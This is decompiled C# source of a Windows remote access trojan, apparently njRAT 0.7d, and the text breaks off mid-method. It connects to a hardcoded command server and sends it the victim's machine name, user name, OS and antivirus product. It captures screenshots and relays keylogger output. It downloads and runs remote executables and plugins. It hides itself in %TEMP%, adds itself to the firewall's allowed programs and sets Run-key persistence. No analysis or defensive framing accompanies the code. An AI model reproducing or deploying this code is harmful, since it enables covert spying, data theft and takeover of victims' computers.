using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns0;

namespace ns1;

[StandardModule]
internal sealed class Class5
{
	private static byte[] byte_0;

	public static bool bool_0;

	public static TcpClient tcpClient_0;

	public static bool bool_1;

	public static string string_0;

	public static string string_1;

	public static Computer computer_0;

	public static FileStream fileStream_0;

	public static string string_2;

	public static bool bool_2;

	public static bool bool_3;

	public static bool bool_4;

	public static bool bool_5;

	public static bool bool_6;

	public static GClass1 gclass1_0;

	private static string string_3;

	public static FileInfo fileInfo_0;

	private static MemoryStream memoryStream_0;

	public static Mutex mutex_0;

	public static string string_4;

	public static object object_0;

	public static string string_5;

	public static string string_6;

	public static string string_7;

	public static string string_8;

	public static string string_9;

	static Class5()
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		Class7.smethod_0();
		byte_0 = new byte[5121];
		bool_0 = Conversions.ToBoolean("True");
		tcpClient_0 = null;
		bool_1 = false;
		string_0 = "TEMP";
		string_1 = "TextInput.exe";
		computer_0 = new Computer();
		string_2 = "DarkVader94-36189.portmap.host";
		bool_2 = Conversions.ToBoolean("True");
		bool_3 = Conversions.ToBoolean("True");
		bool_4 = Conversions.ToBoolean("False");
		bool_5 = Conversions.ToBoolean("False");
		bool_6 = Conversions.ToBoolean("True");
		gclass1_0 = null;
		string_3 = "";
		fileInfo_0 = new FileInfo(Assembly.GetEntryAssembly()!.Location);
		memoryStream_0 = new MemoryStream();
		mutex_0 = null;
		string_4 = "36189";
		object_0 = null;
		string_5 = "3abeb6c3f790632015f824655ef204ca";
		string_6 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		string_7 = "T2ZmaWNlIFVzZXI=";
		string_8 = "0.7d";
		string_9 = "Y262SUCZ4UJJ";
	}

	public Class5()
	{
		Class7.smethod_0();
		base._002Ector();
	}

	[DebuggerStepThrough]
	[CompilerGenerated]
	private static void smethod_0(byte[] byte_1)
	{
		smethod_14(byte_1);
	}

	[CompilerGenerated]
	[DebuggerStepThrough]
	private static void smethod_1(object object_1, object object_2)
	{
		smethod_9();
	}

	public static string smethod_2()
	{
		string result;
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			if (foregroundWindow == IntPtr.Zero)
			{
				return "";
			}
			string string_ = Strings.Space(checked(GetWindowTextLengthA((long)foregroundWindow) + 1));
			GetWindowTextA(foregroundWindow, ref string_, string_.Length);
			result = smethod_10(ref string_);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			result = "";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static string smethod_3(ref byte[] byte_1)
	{
		return Encoding.UTF8.GetString(byte_1);
	}

	public static bool smethod_4()
	{
		checked
		{
			try
			{
				int num = 0;
				do
				{
					string string_ = null;
					short short_ = (short)num;
					string string_2 = Strings.Space(100);
					if (!capGetDriverDescriptionA(short_, ref string_2, 100, ref string_, 100))
					{
						num++;
						continue;
					}
					return true;
				}
				while (num <= 4);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool capGetDriverDescriptionA(short short_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_10, int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, int int_1);

	private static bool smethod_5(FileInfo fileInfo_1, FileInfo fileInfo_2)
	{
		if (Operators.CompareString(fileInfo_1.get_Name().ToLower(), fileInfo_2.get_Name().ToLower(), false) == 0)
		{
			DirectoryInfo directoryInfo = fileInfo_1.Directory;
			DirectoryInfo directoryInfo2 = fileInfo_2.Directory;
			do
			{
				if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
				{
					directoryInfo = directoryInfo.Parent;
					directoryInfo2 = directoryInfo2.Parent;
					if (!(directoryInfo == null && directoryInfo2 == null))
					{
						if (directoryInfo == null)
						{
							return false;
						}
						continue;
					}
					return true;
				}
				return false;
			}
			while (directoryInfo2 != null);
		}
		return false;
	}

	public static bool smethod_6()
	{
		bool_1 = false;
		Thread.Sleep(2000);
		FileInfo fileInfo = fileInfo_0;
		lock (fileInfo)
		{
			try
			{
				if (tcpClient_0 != null)
				{
					try
					{
						tcpClient_0.Close();
						tcpClient_0 = null;
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception projectError = ex;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					memoryStream_0.Dispose();
				}
				catch (Exception ex2)
				{
					ProjectData.SetProjectError(ex2);
					Exception projectError2 = ex2;
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception projectError3 = ex3;
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				memoryStream_0 = new MemoryStream();
				tcpClient_0 = new TcpClient();
				tcpClient_0.ReceiveBufferSize = 204800;
				tcpClient_0.SendBufferSize = 204800;
				tcpClient_0.Client.SendTimeout = 10000;
				tcpClient_0.Client.ReceiveTimeout = 10000;
				tcpClient_0.Connect(string_2, Conversions.ToInteger(string_4));
				bool_1 = true;
				smethod_23(smethod_15());
				try
				{
					string text = default(string);
					if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(smethod_12("vn", "")), (object)"", false))
					{
						text = text + smethod_7(ref string_7) + "\r\n";
					}
					else
					{
						string text2 = text;
						string string_ = Conversions.ToString(RuntimeHelpers.GetObjectValue(smethod_12("vn", "")));
						text = text2 + smethod_7(ref string_) + "\r\n";
					}
					text = text + string_2 + ":" + string_4 + "\r\n" + string_0 + "\r\n" + string_1 + "\r\n" + Conversions.ToString(bool_2) + "\r\n" + Conversions.ToString(bool_4) + "\r\n" + Conversions.ToString(bool_6) + "\r\n" + Conversions.ToString(bool_0);
					smethod_23("inf" + string_9 + smethod_10(ref text));
				}
				catch (Exception ex4)
				{
					ProjectData.SetProjectError(ex4);
					Exception projectError4 = ex4;
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception projectError5 = ex5;
				ProjectData.SetProjectError(projectError5);
				bool_1 = false;
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		return bool_1;
	}

	public static string smethod_7(ref string string_10)
	{
		byte[] byte_ = Convert.FromBase64String(string_10);
		return smethod_3(ref byte_);
	}

	public static void smethod_8(string string_10)
	{
		try
		{
			((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + string_5, writable: true)!.DeleteValue(string_10);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_9()
	{
		smethod_20(0);
	}

	public static string smethod_10(ref string string_10)
	{
		return Convert.ToBase64String(smethod_22(ref string_10));
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_10, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_11, int int_0, ref int int_1, ref int int_2, ref int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_12, int int_4);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_10, int int_0);

	public static string smethod_11()
	{
		int try0001_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		string result = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				case 238:
					num2 = num;
					if (num3 == 0 || num3 != 1)
					{
						goto end_IL_0001;
					}
					num2 = 0;
					break;
				}
				num = 1;
				object obj = "Select * From AntiVirusProduct";
				num = 2;
				object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\\\.\\root\\SecurityCenter2", (string)null)));
				num = 3;
				object[] array = new object[1] { RuntimeHelpers.GetObjectValue(obj) };
				bool[] array2 = new bool[1] { true };
				if (array2[0])
				{
					obj = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array[0]));
				}
				object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "ExecQuery", array, (string[])null, (Type[])null, array2)));
				num = 4;
				IEnumerator enumerator = ((IEnumerable)objectValue2).GetEnumerator();
				if (!enumerator.MoveNext())
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					num = 8;
					result = "No AV";
				}
				else
				{
					object objectValue3 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(enumerator.Current));
					num3 = 1;
					num = 6;
					result = NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue3), (Type)null, "displayName", new object[0], (string[])null, (Type[])null, (bool[])null).ToString();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				try0001_dispatch = 238;
				continue;
			}
			break;
			continue;
			end_IL_0001:
			break;
		}
		if (num2 == 0)
		{
		}
		return result;
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long long_0);

	public static object smethod_12(string string_10, object object_1)
	{
		object objectValue;
		try
		{
			objectValue = RuntimeHelpers.GetObjectValue(((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\" + string_5)!.GetValue(string_10, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(object_1))));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			objectValue = RuntimeHelpers.GetObjectValue(object_1);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return objectValue;
	}

	public static string smethod_13()
	{
		string result;
		try
		{
			string string_ = null;
			int int_ = 0;
			int int_2 = 0;
			string string_2 = null;
			string string_3 = Interaction.Environ("SystemDrive") + "\\";
			int int_3 = default(int);
			GetVolumeInformationA(ref string_3, ref string_, 0, ref int_3, ref int_, ref int_2, ref string_2, 0);
			result = Conversion.Hex(int_3);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			result = "ERR";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_14(byte[] byte_1)
	{
		//IL_0499: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a0: Expected O, but got Unknown
		//IL_052b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0532: Expected O, but got Unknown
		string[] array = Strings.Split(smethod_3(ref byte_1), string_9, -1, (CompareMethod)0);
		checked
		{
			try
			{
				string text = array[0];
				switch (text)
				{
				case "prof":
					switch (array[1])
					{
					case "@":
						smethod_8(array[2]);
						break;
					case "!":
						smethod_25(array[2], array[3], RegistryValueKind.String);
						smethod_23(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object)("getvalue" + string_9 + array[1] + string_9), RuntimeHelpers.GetObjectValue(smethod_12(array[1], ""))))));
						break;
					case "~":
						smethod_25(array[2], array[3], RegistryValueKind.String);
						break;
					}
					return;
				case "kl":
					smethod_23("kl" + string_9 + smethod_10(ref gclass1_0.string_1));
					return;
				case "ll":
					bool_1 = false;
					return;
				}
				if (Operators.CompareString(text, "rn", false) != 0)
				{
					switch (text)
					{
					case "un":
						switch (array[1])
						{
						case "@":
							smethod_20(0);
							Process.Start(fileInfo_0.FullName);
							ProjectData.EndApp();
							break;
						case "!":
							smethod_20(0);
							ProjectData.EndApp();
							break;
						case "~":
							smethod_26();
							break;
						}
						return;
					case "CAP":
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, bounds.Height, (PixelFormat)135173);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						Size size = new Size(((Image)val).get_Width(), ((Image)val).get_Height());
						val2.CopyFromScreen(0, 0, 0, 0, size, (CopyPixelOperation)13369376);
						try
						{
							size = new Size(32, 32);
							bounds = new Rectangle(Cursor.get_Position(), size);
							Cursors.get_Default().Draw(val2, bounds);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception projectError = ex;
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
						}
						val2.Dispose();
						Bitmap val3 = new Bitmap(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
						val2 = Graphics.FromImage((Image)(object)val3);
						val2.DrawImage((Image)(object)val, 0, 0, ((Image)val3).get_Width(), ((Image)val3).get_Height());
						val2.Dispose();
						MemoryStream memoryStream2 = new MemoryStream();
						string string_ = "CAP" + string_9;
						byte_1 = smethod_22(ref string_);
						memoryStream2.Write(byte_1, 0, byte_1.Length);
						MemoryStream memoryStream3 = new MemoryStream();
						((Image)val3).Save((Stream)memoryStream3, ImageFormat.get_Jpeg());
						string text2 = smethod_18(memoryStream3.ToArray());
						if (Operators.CompareString(text2, string_3, false) != 0)
						{
							string_3 = text2;
							memoryStream2.Write(memoryStream3.ToArray(), 0, (int)memoryStream3.Length);
						}
						else
						{
							memoryStream2.WriteByte(0);
						}
						smethod_24(memoryStream2.ToArray());
						memoryStream2.Dispose();
						memoryStream3.Dispose();
						((Image)val).Dispose();
						((Image)val3).Dispose();
						return;
					}
					case "ret":
					{
						byte[] array3 = (byte[])smethod_12(array[1], new byte[0]);
						if ((array[2].Length < 10) & (array3.Length == 0))
						{
							smethod_23("pl" + string_9 + array[1] + string_9 + Conversions.ToString(1));
							return;
						}
						if (array[2].Length > 10)
						{
							MemoryStream memoryStream4 = new MemoryStream();
							int length2 = (array[0] + string_9 + array[1] + string_9).Length;
							memoryStream4.Write(byte_1, length2, byte_1.Length - length2);
							array3 = smethod_27(memoryStream4.ToArray());
							smethod_25(array[1], array3, RegistryValueKind.Binary);
						}
						smethod_23("pl" + string_9 + array[1] + string_9 + Conversions.ToString(0));
						object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(smethod_19(array3, "A")));
						string[] obj = new string[5]
						{
							"ret",
							string_9,
							array[1],
							string_9,
							null
						};
						string string_ = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue2), (Type)null, "GT", new object[0], (string[])null, (Type[])null, (bool[])null)));
						obj[4] = smethod_10(ref string_);
						smethod_23(string.Concat(obj));
						return;
					}
					case "inv":
					{
						byte[] array2 = (byte[])smethod_12(array[1], new byte[0]);
						if ((array[3].Length < 10) & (array2.Length == 0))
						{
							smethod_23("pl" + string_9 + array[1] + string_9 + Conversions.ToString(1));
							return;
						}
						if (array[3].Length > 10)
						{
							MemoryStream memoryStream = new MemoryStream();
							int length = (array[0] + string_9 + array[1] + string_9 + array[2] + string_9).Length;
							memoryStream.Write(byte_1, length, byte_1.Length - length);
							array2 = smethod_27(memoryStream.ToArray());
							smethod_25(array[1], array2, RegistryValueKind.Binary);
						}
						smethod_23("pl" + string_9 + array[1] + string_9 + Conversions.ToString(0));
						object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(smethod_19(array2, "A")));
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "h", new object[1] { string_2 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "p", new object[1] { string_4 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "osk", new object[1] { array[2] }, (string[])null, (Type[])null);
						NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object)(!bool_1), RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "Off", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)true, false))))))
						{
							Thread.Sleep(1);
						}
						NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (Type)null, "off", new object[1] { true }, (string[])null, (Type[])null);
						return;
					}
					}
					if (Operators.CompareString(text, "up", false) != 0)
					{
						if (Operators.CompareString(text, "Ex", false) == 0)
						{
							if (object_0 == null)
							{
								smethod_23("PLG");
								int num = 0;
								while (!(unchecked(object_0 != null || num == 20) | !bool_1))
								{
									num++;
									Thread.Sleep(1000);
								}
								if ((object_0 == null) | !bool_1)
								{
									return;
								}
							}
							object[] array4 = new object[1] { byte_1 };
							bool[] array5 = new bool[1] { true };
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(object_0), (Type)null, "ind", array4, (string[])null, (Type[])null, array5, true);
							if (array5[0])
							{
								byte_1 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array4[0])), typeof(byte[]));
							}
						}
						else if (Operators.CompareString(text, "PLG", false) == 0)
						{
							MemoryStream memoryStream5 = new MemoryStream();
							int length3 = (array[0] + string_9).Length;
							memoryStream5.Write(byte_1, length3, byte_1.Length - length3);
							object_0 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(smethod_19(smethod_27(memoryStream5.ToArray()), "A")));
							NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(object_0), (Type)null, "H", new object[1] { string_2 }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(object_0), (Type)null, "P", new object[1] { string_4 }, (string[])null, (Type[])null);
							NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(object_0), (Type)null, "c", new object[1] { tcpClient_0 }, (string[])null, (Type[])null);
						}
						return;
					}
					byte[] array6 = null;
					if (array[1][0] == '\u001f')
					{
						try
						{
							MemoryStream memoryStream6 = new MemoryStream();
							int length4 = (array[0] + string_9).Length;
							memoryStream6.Write(byte_1, length4, byte_1.Length - length4);
							array6 = smethod_27(memoryStream6.ToArray());
						}
						catch (Exception ex2)
						{
							ProjectData.SetProjectError(ex2);
							Exception projectError2 = ex2;
							ProjectData.SetProjectError(projectError2);
							smethod_23("MSG" + string_9 + "Update ERROR");
							smethod_23("bla");
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
					else
					{
						WebClient webClient = new WebClient();
						try
						{
							array6 = webClient.DownloadData(array[1]);
						}
						catch (Exception ex3)
						{
							ProjectData.SetProjectError(ex3);
							Exception projectError3 = ex3;
							ProjectData.SetProjectError(projectError3);
							smethod_23("MSG" + string_9 + "Update ERROR");
							smethod_23("bla");
							ProjectData.ClearProjectError();
							ProjectData.ClearProjectError();
							return;
						}
					}
					smethod_23("bla");
					string text3 = Path.GetTempFileName() + ".exe";
					try
					{
						smethod_23("MSG" + string_9 + "Updating To " + new FileInfo(text3).get_Name());
						Thread.Sleep(2000);
						File.WriteAllBytes(text3, array6);
						Process.Start(text3, "..");
					}
					catch (Exception ex4)
					{
						ProjectData.SetProjectError(ex4);
						Exception ex5 = ex4;
						ProjectData.SetProjectError(ex5);
						Exception ex6 = ex5;
						smethod_23("MSG" + string_9 + "Update ERROR " + ex6.Message);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
					smethod_26();
					return;
				}
				byte[] bytes;
				if (array[2][0] == '\u001f')
				{
					try
					{
						MemoryStream memoryStream7 = new MemoryStream();
						int length5 = (array[0] + string_9 + array[1] + string_9).Length;
						memoryStream7.Write(byte_1, length5, byte_1.Length - length5);
						bytes = smethod_27(memoryStream7.ToArray());
					}
					catch (Exception ex7)
					{
						ProjectData.SetProjectError(ex7);
						Exception projectError4 = ex7;
						ProjectData.SetProjectError(projectError4);
						smethod_23("MSG" + string_9 + "Execute ERROR");
						smethod_23("bla");
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				else
				{
					WebClient webClient2 = new WebClient();
					try
					{
						bytes = webClient2.DownloadData(array[2]);
					}
					catch (Exception ex8)
					{
						ProjectData.SetProjectError(ex8);
						Exception projectError5 = ex8;
						ProjectData.SetProjectError(projectError5);
						smethod_23("MSG" + string_9 + "Download ERROR");
						smethod_23("bla");
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
						return;
					}
				}
				smethod_23("bla");
				string text4 = Path.GetTempFileName() + "." + array[1];
				try
				{
					File.WriteAllBytes(text4, bytes);
					Process.Start(text4);
					smethod_23("MSG" + string_9 + "Executed As " + new FileInfo(text4).get_Name());
				}
				catch (Exception ex9)
				{
					ProjectData.SetProjectError(ex9);
					Exception ex10 = ex9;
					ProjectData.SetProjectError(ex10);
					Exception ex11 = ex10;
					smethod_23("MSG" + string_9 + "Execute ERROR " + ex11.Message);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex12)
			{
				ProjectData.SetProjectError(ex12);
				Exception ex13 = ex12;
				ProjectData.SetProjectError(ex13);
				Exception ex14 = ex13;
				if (array.Length > 0 && ((Operators.CompareString(array[0], "Ex", false) == 0) | (Operators.CompareString(array[0], "PLG", false) == 0)))
				{
					object_0 = null;
				}
				try
				{
					smethod_23("ER" + string_9 + array[0] + string_9 + ex14.Message);
				}
				catch (Exception ex15)
				{
					ProjectData.SetProjectError(ex15);
					Exception projectError6 = ex15;
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string smethod_15()
	{
		string text = "ll" + string_9;
		try
		{
			if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(smethod_12("vn", "")), (object)"", false))
			{
				string text2 = text;
				string string_ = smethod_7(ref string_7) + "_" + smethod_13();
				text = text2 + smethod_10(ref string_) + string_9;
			}
			else
			{
				string text3 = text;
				string string_2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(smethod_12("vn", "")));
				string string_ = smethod_7(ref string_2) + "_" + smethod_13();
				text = text3 + smethod_10(ref string_) + string_9;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception projectError = ex;
			ProjectData.SetProjectError(projectError);
			string text4 = text;
			string string_ = smethod_13();
			text = text4 + smethod_10(ref string_) + string_9;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.MachineName + string_9;
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError2 = ex2;
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + string_9;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + string_9;
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception projectError3 = ex3;
			ProjectData.SetProjectError(projectError3);
			text = text + "??" + string_9;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + fileInfo_0.LastWriteTime.Date.ToString("yy-MM-dd") + string_9;
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Exception projectError4 = ex4;
			ProjectData.SetProjectError(projectError4);
			text = text + "??-??-??" + string_9;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text += string_9;
		try
		{
			text += ((ServerComputer)computer_0).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Exception projectError5 = ex5;
			ProjectData.SetProjectError(projectError5);
			text += "??";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6);
			Exception projectError6 = ex6;
			ProjectData.SetProjectError(projectError6);
			text += "0";
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + string_9) : (text + " x64" + string_9));
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception projectError7 = ex7;
			ProjectData.SetProjectError(projectError7);
			text += string_9;
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		text = ((!smethod_4()) ? (text + "No" + string_9) : (text + "Yes" + string_9));
		text = text + smethod_11() + string_9 + smethod_11() + string_9 + smethod_11() + string_9;
		string text5 = "";
		try
		{
			string[] valueNames = ((ServerComputer)computer_0).get_Registry().get_CurrentUser().CreateSubKey("Software\\" + string_5, RegistryKeyPermissionCheck.Default)
				.GetValueNames();
			foreach (string text6 in valueNames)
			{
				if (text6.Length == 32)
				{
					text5 = text5 + text6 + ",";
				}
			}
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8);
			Exception projectError8 = ex8;
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		return text + text5;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_16()
	{
		Thread.Sleep(1000);
		if (bool_2 && !smethod_5(fileInfo_0, new FileInfo(Interaction.Environ(string_0).ToLower() + "\\" + string_1.ToLower())))
		{
			try
			{
				if (File.Exists(Interaction.Environ(string_0) + "\\" + string_1))
				{
					File.Delete(Interaction.Environ(string_0) + "\\" + string_1);
				}
				FileStream fileStream = new FileStream(Interaction.Environ(string_0) + "\\" + string_1, FileMode.CreateNew);
				byte[] array = File.ReadAllBytes(fileInfo_0.FullName);
				fileStream.Write(array, 0, array.Length);
				fileStream.Flush();
				fileStream.Close();
				fileInfo_0 = new FileInfo(Interaction.Environ(string_0) + "\\" + string_1);
				Process.Start(fileInfo_0.FullName);
				ProjectData.EndApp();
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception projectError2 = ex2;
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell("netsh firewall add allowedprogram \"" + fileInfo_0.FullName + "\" \"" + fileInfo_0.get_Name() + "\" ENABLE", (AppWinStyle)0, true, 5000);
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception projectError3 = ex3;
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
			ProjectData.ClearProjectError();
		}
		if (bool_6)
		{
			try
			{
				((ServerComputer)computer_0).get_Registry().get_CurrentUser().OpenSubKey(string_6, writable: true)!.SetValue(string_5, "\"" + fileInfo_0.FullName + "\" ..");
			}
			catch (Exception ex4)
			{
				ProjectData.SetProjectError(ex4);
				Exception projectError4 = ex4;
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				((ServerComputer)computer_0).get_Registry().get_LocalMachine().OpenSubKey(string_6, writable: true)!.SetValue(string_5, "\"" + fileInfo_0.FullName + "\" ..");
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception projectError5 = ex5;
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}
		if (bool_4)
		{
			try
			{
